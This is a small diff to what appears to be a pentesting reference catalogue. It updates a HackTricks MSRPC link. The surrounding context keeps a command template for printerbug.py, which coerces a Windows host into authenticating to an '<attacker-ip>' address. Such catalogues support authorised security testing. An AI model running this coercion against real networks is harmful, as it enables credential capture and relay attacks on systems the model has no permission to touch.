@@ -33,5 +33,5 @@ commands:
     template: "python3 printerbug.py EXAMPLE.LOCAL/<user>:<pass>@{IP} <attacker-ip>"
 resources:
   - title: "135 - Pentesting MSRPC"
-    url: "https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc"
+    url: "https://hacktricks.wiki/en/network-services-pentesting/135-pentesting-msrpc.html"
     author: HackTricks
